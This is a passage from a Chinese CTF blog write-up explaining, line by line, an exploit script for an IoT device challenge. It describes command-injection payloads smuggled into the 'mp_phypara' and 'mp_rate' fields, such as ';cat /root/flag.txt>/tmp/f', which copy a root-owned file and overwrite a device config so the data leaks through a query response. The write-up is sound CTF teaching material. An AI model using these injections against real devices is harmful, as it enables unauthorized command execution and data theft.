+<li><p><code>out = b&quot;&quot;</code>：初始化一个空字节串，用于累积接收到的数据。</p>
+</li>
+<li><p><code>while True</code>：无限循环，直到遇到 <code>break</code> 退出。</p>
+</li>
+<li><p><code>chunk = sock.recv(8192)</code>：每次最多读取 8192 字节。</p>
+<ul>
+<li>如果返回空字节 <code>b&quot;&quot;</code>，说明对端关闭了连接，此时 <code>break</code>。</li>
+</ul>
+</li>
+<li><p><code>out += chunk</code>：将读取到的数据拼接到总缓冲区。</p>
+</li>
+<li><p><code>if b&quot;\n&quot; in out: break</code>：一旦发现累积数据中包含换行符，说明收到了完整的消息帧，立即退出循环（不再等待更多数据）。</p>
+</li>
+<li><p><code>out.decode(errors=&quot;replace&quot;)</code>：将字节串按 UTF-8 解码为字符串。</p>
+<ul>
+<li><code>errors=&quot;replace&quot;</code> 是个容错机制：如果遇到非法 UTF-8 字节，不会抛出异常，而是用（U+FFFD）替换，保证程序不会因为网络杂音而崩溃。</li>
+</ul>
+</li>
+<li><p><code>def cmd(**param)</code>：定义函数 <code>cmd</code>，使用 <code>**</code> 关键字参数收集语法。</p>
+<ul>
+<li>当你调用 <code>cmd(mp_phypara=&quot;;cat ...&quot;)</code> 时，<code>param</code> 会自动变成一个字典：<code>&#123;&#39;mp_phypara&#39;: &#39;;cat ...&#39;&#125;</code>。</li>
+</ul>
+</li>
+<li><p>函数体：构造一个符合目标 API 格式的字典 <code>&#123;&quot;method&quot;: &quot;PTRfTxCali&quot;, &quot;param&quot;: param&#125;</code>，然后调用 <code>udp</code> 发送并返回响应。</p>
+</li>
+<li><p>发送一个合法的查询请求给 <code>Tenda_mfg_htmlVersionInfo</code> 接口，<code>param</code> 为空对象。此时服务端会从被篡改的 <code>/opt/sav/Config/device.conf</code> 中读取配置，并将其填充到响应 JSON 中。</p>
+</li>
+<li><p><code>re.search(r&#39;&quot;MAC&quot;:&quot;(.\*?)&quot;&#39;, resp)</code>：正则搜索。</p>
+<ul>
+<li><code>r&quot;...&quot;</code> 是原始字符串，防止反斜杠被转义。</li>
+<li><code>&quot;MAC&quot;:&quot;(.*?)&quot;</code>：精确匹配 JSON 中的 <code>MAC</code> 字段，<code>(.*?)</code> 是非贪婪捕获组，只匹配到最近的 <code>&quot;</code> 为止，防止跨字段匹配。</li>
+</ul>
+</li>
+<li><p><code>m.group(1)</code>：取出正则捕获的第一组内容（即 MAC 字段的值，也就是 Flag）。</p>
+</li>
+<li><p><code>.encode()</code>：将字符串转为字节流。</p>
+</li>
+<li><p><code>.decode(&quot;unicode_escape&quot;)</code>：这是转义还原语法。服务端返回的 JSON 中，特殊字符（如换行符 <code>\n</code>、双引号 <code>\&quot;</code>）会被转义。这行代码将 <code>\n</code> 还原为真正的换行符，<code>\\</code> 还原为 <code>\</code>，保证输出与原始文件完全一致。</p>
+</li>
+<li><p><code>.strip()</code>：移除字符串首尾的空白字符（如 <code>fgets</code> 可能残留的换行符）。</p>
+</li>
+<li><p>第一次注入（读取原始 Flag）：</p>
+<ul>
+<li>利用 <code>mp_phypara</code> 字段注入，Payload 为 <code>;cat /root/flag.txt&gt;/tmp/f</code>。</li>
+<li><strong><code>;</code></strong>：分号是 Shell 命令分隔符，结束前面的 <code>rtwpriv</code> 命令。</li>
+<li><code>cat /root/flag.txt</code>：读取 Flag 文件内容。</li>
+<li><strong><code>&gt;</code></strong>：输出重定向，将 <code>cat</code> 的结果写入 <code>/tmp/f</code>（覆盖模式）。</li>
+<li>目的：把敏感数据从受限制目录“搬运”到可随意操作的临时目录。</li>
+</ul>
+</li>
+<li><p>第二次注入（格式化数据）：</p>
+<ul>
+<li>利用同样的 <code>mp_phypara</code> 字段，执行 <code>sed</code> 命令。</li>
+<li><code>sed -i</code>：<code>-i</code> 表示直接修改文件（in-place），不输出到屏幕。</li>
+<li><code>s/^/mac_info=/</code>：这是 <code>sed</code> 的替换语法。<ul>
+<li><code>s</code> 是替换命令。</li>
+<li><code>/</code> 是分隔符。</li>
+<li><code>^</code> 是正则表达式的行首锚点。</li>
+<li>整句意思：在文件的每一行开头插入 <code>mac_info=</code>。</li>
+</ul>
+</li>
+<li>效果：假设 <code>/tmp/f</code> 内容为 <code>NepCTF&#123;...&#125;</code>，执行后变为 <code>mac_info=NepCTF&#123;...&#125;</code>，使其符合配置文件的键值对格式。</li>
+</ul>
+</li>
+<li><p>第三次注入（投毒配置文件）：</p>
+<ul>
+<li>这次换用 <code>mp_rate</code>*字段注入，执行 <code>cp</code> 命令。</li>
+<li><code>cp /tmp/f /opt/sav/Config/device.conf</code>：强制将格式化后的临时文件复制（覆盖）到设备启动时读取的核心配置路径。</li>
+<li>为什么换字段？一是为了证明该程序多处参数存在注入；二是避免连续使用同一参数触发服务端的某种“去重”或“状态锁”机制。</li>
+</ul>
+</li>
+</ul>
+<p>上述对于exp的解释都是出自于ai之手，如有错误望多包涵。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/08/21/What-s-the-IPC/">http://example.com/2026/08/21/What-s-the-IPC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT/">IOT</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/07/23/CNVD-2013-11625-DIR-815/" title="CNVD-2013-11625_DIR-815"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-23</div><div class="info-item-2">CNVD-2013-11625_DIR-815</div></div><div class="info-2"><div class="info-item-1">CNVD-2013-11625 DIR-815 栈溢出漏洞官方的漏洞报告：国家信息安全漏洞共享平台 固件下载地址:下载 (需要挂梯子) binwalk安装：sudo apt install binwalk sasquatch安装：https://github.com/devttys0/sasquatch （直接在命令行里git下来就好了，然后问下ai怎么安装。如果在运行build.sh脚本时出现问题，先不要慌，下面可能有符合你的解决方法。如果还是失败，交给ai） 一.固件提取1binwalk -e --preserve-symlinks firmware_name  在下载完这些工具，提取时可能会出现一些问题。 12345678910111213141516171819202122232425x1z1@x1z1:~/Desktop/CNVD-2013-11625 DIR-815/dir815_FW_101$ binwalk -e --preserve-symlinks DIR-815_v1.01b14.binTraceback (most recent call last):  ...</div></div></div></a><a class="pagination-related" href="/2026/08/05/CNVD-2018-01084/" title="CNVD-2018-01084"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-05</div><div class="info-item-2">CNVD-2018-01084</div></div><div class="info-2"><div class="info-item-1">CNVD-2018-01084官方报告：cnvd.org.cn&#x2F;flaw&#x2F;show&#x2F;CNVD-2018-01084 固件：下载 固件提取部分就不阐述了，接下来直接看静态分析。 一.逆向分析123456if ( !strcmp(v3, &quot;service.cgi&quot;) )  &#123;    phpcgi_main_1 = servicecgi_main;    argc_1 = argc;    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))phpcgi_main_1)(argc_1, argv, envp);  &#125;  根据报告，我们先找到这个service.cgi，然后看servicecgi_main函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697...</div></div></div></a><a class="pagination-related" href="/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/" title="异架构汇编"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-16</div><div class="info-item-2">异架构汇编</div></div><div class="info-2"><div class="info-item-1">异架构汇编异架构汇编存在三种，分别是PowerPC，ARM&amp;AARCH64，MIPS 从 x86 到 RISCx86 是 CISC（复杂指令集），而 ARM、MIPS、PowerPC 均属于 RISC（精简指令集）。  Load&#x2F;Store 架构：RISC 架构不能直接对内存中的数据进行加减乘除等运算。必须先将数据 Load 到寄存器中，在寄存器里完成运算，然后再 Store 回内存。 寄存器数量多：通常有 32 个以上的通用寄存器。因此，函数传参主要依赖寄存器，而不是像早期 x86 那样依赖栈。 指令定长：大多数情况下指令长度固定为 4 字节（除了 ARM 的 Thumb 模式），这对 ROP 链的构造和 shellcode 的编写影响巨大。  PowerPC(工业控制与汽车电子)PowerPC 架构下的函数调用约定是通过寄存器传递参数，而不是通过栈传递参数。但当参数数量过多时，会将多余的参数压入栈中，因此栈帧中也会包含函数参数。 寄存器设计复杂：拥有 32 个通用寄存器 (GPR)，还有专门的链接寄存器 (LR)、计数器寄存器 (CTR) 和条件寄存器 (C...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/21/What-s-the-IPC/" title="What's the IPC">What's the IPC</a><time datetime="2026-08-21T09:59:48.000Z" title="发表于 2026-08-21 17:59:48">2026-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/21/IPC/" title="IPC">IPC</a><time datetime="2026-08-21T09:54:03.000Z" title="发表于 2026-08-21 17:54:03">2026-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/12/Nepctf2026/" title="Nepctf2026">Nepctf2026</a><time datetime="2026-08-12T08:54:35.000Z" title="发表于 2026-08-12 16:54:35">2026-08-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/05/CNVD-2018-01084/" title="CNVD-2018-01084">CNVD-2018-01084</a><time datetime="2026-08-04T16:50:30.000Z" title="发表于 2026-08-05 00:50:30">2026-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/23/CNVD-2013-11625-DIR-815/" title="CNVD-2013-11625_DIR-815">CNVD-2013-11625_DIR-815</a><time datetime="2026-07-23T04:30:41.000Z" title="发表于 2026-07-23 12:30:41">2026-07-23</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CVE%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">CVE复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/IOT/" style="font-size: 1.23em; color: #999ea6">IOT</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.37em; color: #99a4b2">pwn入门</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/08/">
+            <span class="card-archive-list-date">
+              八月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/07/">
+            <span class="card-archive-list-date">
+              七月 2026
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/06/">
+            <span class="card-archive-list-date">
+              六月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/05/">
+            <span class="card-archive-list-date">
+              五月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">41</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-08-21T17:03:17.810Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
